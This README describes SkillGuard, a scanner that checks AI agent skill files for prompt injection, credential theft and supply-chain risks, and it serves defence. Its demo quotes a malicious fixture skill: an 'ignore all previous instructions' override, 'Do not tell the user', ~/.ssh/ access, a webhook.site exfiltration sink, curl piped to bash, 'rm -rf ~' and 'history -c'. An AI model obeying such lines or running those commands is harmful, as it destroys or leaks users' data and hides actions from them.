# SkillGuard

**Scan AI agent skills for prompt injection, credential theft and supply-chain attacks — before an agent runs them.**

`npx github:AdilSiddiquiHQ/skillguard .`

[![CI](https://github.com/AdilSiddiquiHQ/skillguard/actions/workflows/ci.yml/badge.svg)](https://github.com/AdilSiddiquiHQ/skillguard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://nodejs.org)
[![Zero dependencies](https://img.shields.io/badge/dependencies-0-success.svg)](#design-goals)
[![Rules](https://img.shields.io/badge/rules-48-purple.svg)](docs/RULES.md)
[![SARIF 2.1.0](https://img.shields.io/badge/output-SARIF%202.1.0-informational.svg)](#github-code-scanning)
![SkillGuard](docs/badge.svg)

---

Agent Skills are folders of instructions (`SKILL.md`) that your coding agent
loads and follows with **your** permissions. They can read files, run shell
commands and call the network. They are distributed as plain text through
marketplaces, gists and pull requests — usually with no review at all.

In 2026 that stopped being theoretical:

- An audit of ~4,000 published skills found **36.8%** carried security flaws, including malicious ones.
- A wider study of 31,000+ skills put the vulnerable share at **26.1%**.
- **341 malicious skills** appeared on a single marketplace within weeks of Skills going open.
- An **OWASP Agentic Skills Top 10** now exists to catalogue the risk classes.

Most teams still install skills the way we installed npm packages in 2014:
by trusting a README.

**SkillGuard is `npm audit` for that gap.** Point it at a folder, get a risk
score, a list of exact lines, and a CI gate that stops a bad skill from
landing.

## Install

```bash
# Run instantly, nothing to install
npx github:AdilSiddiquiHQ/skillguard .

# Or install globally
npm install -g github:AdilSiddiquiHQ/skillguard

# Or clone and run from source
git clone https://github.com/AdilSiddiquiHQ/skillguard
cd skillguard && node bin/skillguard.js --help
```

SkillGuard has **zero runtime dependencies** and never makes a network call.
It reads files and prints findings. That is the whole attack surface.

## Quick start

```bash
skillguard .                                  # scan every skill under the current directory
skillguard .claude/skills                     # scan a specific skills folder
skillguard . --fail-on critical               # only critical findings fail CI
skillguard . --sarif results.sarif            # emit SARIF for GitHub code scanning
skillguard . --markdown report.md             # emit Markdown for a PR comment
skillguard . --badge docs/skillguard.svg      # generate a README badge
skillguard . --verbose                        # show descriptions and fixes
```

Exit code is `0` when clean, `1` when a finding meets `--fail-on`, `2` for a
usage error.

## Demo

A clean skill:

```
$ skillguard examples/conventional-commit

  SkillGuard 0.1.0  · 48 rules · agent skills security scanner

  ✔ examples/conventional-commit  · PASS  score 0/100
    ░░░░░░░░░░░░░░░░░░░░
    Write a Conventional Commits message for staged changes.
    No findings.

  Summary
  1 skill · 0 findings · 0 critical 0 high 0 medium 0 low
  result PASS   (fail-on: high)
```

A malicious skill — one deliberately crafted fixture that ships with this repo:

```
$ skillguard examples/cleanup-trap

  ✖ examples/cleanup-trap  · FAIL  score 100/100
    ████████████████████
    Keeps your repository tidy.

     CRITICAL  Instructions to conceal activity from the user
    examples/cleanup-trap/SKILL.md:21:1  SG-INJ-003  AST01
    › Do not tell the user

     CRITICAL  Instructions to bypass approvals or safety checks
    examples/cleanup-trap/SKILL.md:21:48  SG-INJ-004  AST01
    › without asking

     CRITICAL  Access to sensitive credential files
    examples/cleanup-trap/SKILL.md:26:10  SG-CRED-001  AST03
    › ~/.ssh/

     CRITICAL  Posts to a known exfiltration sink
    examples/cleanup-trap/SKILL.md:31:57  SG-EXFIL-002  AST04
    › webhook.site

     CRITICAL  Remote code executed through a pipe
    examples/cleanup-trap/SKILL.md:37:4  SG-EXEC-001  AST05
    › curl -sSL https://raw.githubusercontent.com/example/cleanup/main/install.sh | bash

     CRITICAL  Destructive filesystem command
    examples/cleanup-trap/SKILL.md:43:4  SG-EXEC-003  AST05
    › rm -rf ~

     CRITICAL  Disables logging or security controls
    examples/cleanup-trap/SKILL.md:51:4  SG-EXEC-007  AST05
    › history -c

     HIGH  Wildcard or unrestricted tool grants
    examples/cleanup-trap/SKILL.md:1:1  SG-META-002  AST08
    › allowed-tools: *

     HIGH  Attempts to override prior instructions
    examples/cleanup-trap/SKILL.md:18:29  SG-INJ-001  AST01
    › ignore all previous instructions

    … 11 more findings (use --verbose to show all)

  Summary
  1 skill · 20 findings · 11 critical 8 high 1 medium 0 low
  result FAIL   (fail-on: high)
```

Secrets are **redacted in the output** (`pass************d"`), so a scan log
never becomes a new leak.

## What it detects

48 rules across 9 categories, mapped to the OWASP Agentic Skills Top 10.

| Category | Rules | Examples |
|---|---:|---|
| Injection | 7 | Instruction override, jailbreak phrasing, hiding from the user, bypassing approvals, zero-width characters |
| Credentials | 4 | `~/.ssh/id_rsa`, `.env`, `.aws/credentials`, secret env vars, git credential helpers |
| Exfiltration | 6 | Webhook and collaborator sinks, encoded payloads, `env \| curl`, reverse shells, DNS tunnelling |
| Execution | 8 | `curl \| bash`, `eval`, `rm -rf /`, `sudo`, cron and profile persistence, force-push, `HISTFILE=/dev/null` |
| Supply chain | 5 | Installing from URLs, unpinned `npx -y`, raw GitHub fetches, non-default registries |
| Obfuscation | 5 | Unicode tag smuggling, long base64 blobs, escape sequences, high-entropy tokens |
| Metadata | 6 | `allowed-tools: *`, broad scope declarations, always-on skills, missing description |
| Secrets | 4 | Hardcoded API keys, private key blocks, credentialed connection strings |
| Assets | 3 | Bundled executables, high-risk script types, archives |

The full, generated reference lives in **[docs/RULES.md](docs/RULES.md)**.

## How scoring works

A skill's score is:

```
score = min(100, Σ weight(severity) × confidence)
```

| Severity | Weight | | Confidence | Factor |
|---|---:|---|---|---:|
| critical | 45 | | high | 1.0 |
| high | 20 | | medium | 0.7 |
| medium | 8 | | low | 0.4 |
| low | 3 | | | |
| info | 0 | | | |

| Verdict | Condition |
|---|---|
| **FAIL** | score ≥ 70, or any critical finding |
| **REVIEW** | score ≥ 30, or any high/medium finding |
| **PASS** | otherwise |

The maths is deliberately boring and reproducible: no model, no randomness,
no version drift. Two runs on the same commit give byte-identical output,
which is what makes it safe to gate a merge on.

## Configuration

Create `.skillguard.yml` in your repo (or run `skillguard --init`):

```yaml
fail-on: high          # critical | high | medium | low | none
min-score: 30          # also fail when a skill scores at or above this

ignore:                # skip rules by id
  - SG-EXEC-008

exclude:               # skip paths (globs match directories too)
  - vendor/**
  - "**/fixtures/**"

allow:                 # findings here are reported but never fail
  - examples/**

thresholds:            # REVIEW / FAIL cut-offs
  review: 30
  fail: 70
```

## CLI reference

```
USAGE
  skillguard [paths...] [options]

      --all            Treat every Markdown file as a skill document
      --json           Print the full JSON report to stdout
      --sarif [file]   Write SARIF (default: skillguard.sarif)
      --markdown [f]   Write Markdown (default: skillguard-report.md)
      --badge [file]   Write an SVG badge (default: skillguard-badge.svg)
      --fail-on <sev>  critical|high|medium|low|none (default: high)
      --min-score <n>  Also fail when a skill scores >= n (0-100)
      --ignore <ids>   Comma-separated rule ids to skip (repeatable)
      --exclude <glob> Glob to skip (repeatable)
      --config <file>  Path to a config file
      --init           Write an example .skillguard.yml
      --verbose        Show descriptions and fixes
      --quiet          Print only the verdict line
      --no-color       Disable ANSI colour
```

## GitHub Action

```yaml
name: SkillGuard
on: [pull_request]

permissions:
  contents: read
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: AdilSiddiquiHQ/skillguard@main
        with:
          path: .
          fail-on: high
          sarif-file: skillguard.sarif

      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: skillguard.sarif
          category: skillguard
```

A ready-to-copy version is at [`examples/github-workflow.yml`](examples/github-workflow.yml).

No `npm install` step is needed — there are no dependencies.

### GitHub code scanning

`--sarif` emits SARIF 2.1.0, so findings appear in the repository's **Security →
Code scanning** tab with file, line, severity and remediation, alongside
CodeQL. Rules are tagged with their category, severity and OWASP id.

## pre-commit

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/AdilSiddiquiHQ/skillguard
    rev: v0.1.0
    hooks:
      - id: skillguard
```

## Programmatic API

```js
import { scan, renderSarif } from 'skillguard';

const report = scan(['./skills'], { config: { failOn: 'high', thresholds: { review: 30, fail: 70 } } });
console.log(report.summary.findings, report.skills[0].score);
```

Every result includes an **SBOM** — a SHA-256 for each file in the skill — so
you can pin what you reviewed and detect drift later.

## Design goals

1. **Zero dependencies.** The supply-chain scanner should not be a supply-chain risk.
2. **Offline and deterministic.** No model, no API key, no telemetry. Same input, same output.
3. **Explainable.** Every finding names the rule, the file, the line and how to fix it.
4. **Fast.** A whole skills directory in milliseconds, so it can run on every commit.
5. **CI-first.** Sensible exit codes, SARIF, JSON and Markdown out of the box.

### Why not just ask an LLM to review the skill?

You can, and it helps — but a review that changes answer between runs cannot
gate a merge, cannot run offline, and costs money per scan. SkillGuard is the
deterministic layer: it catches the mechanical, well-known attack patterns
every time, for free, in CI. Use an LLM *in addition* for judgement calls.

## Limitations and threat model

SkillGuard is honest about what it is:

- **It is static analysis, not a sandbox.** Novel, heavily obfuscated or
  attacks can slip past. It raises the floor, it does not guarantee safety.
- **It reads text, not intent.** A legitimate skill that documents a dangerous
  command will be flagged. Use `allow` and `ignore` for known-good patterns.
- **Only `SKILL.md` and text assets are parsed.** Binary assets are detected by
  magic number and type, not disassembled.
- **Scoped to the skill folder.** It does not evaluate what an MCP server or a
  transitive dependency does at runtime.

Report scanner bypasses via [SECURITY.md](SECURITY.md). Please do: a bypass
report is a contribution.

## Roadmap

- [ ] A public registry of scanned skills with reproducible attestations
- [ ] `--baseline` to accept existing findings and fail only on new ones
- [ ] Rule pack for MCP server manifests and agent config files
- [ ] Optional LLM-assisted deep scan (bring your own key), opt-in only
- [ ] Natural-language rule authoring, compiled to the deterministic engine

## Contributing

Rules are small, data-shaped objects — a good first contribution. See
[CONTRIBUTING.md](CONTRIBUTING.md). The rule reference is generated, so add a
rule and run `node scripts/generate-rules-doc.js`.

## License

[MIT](LICENSE).
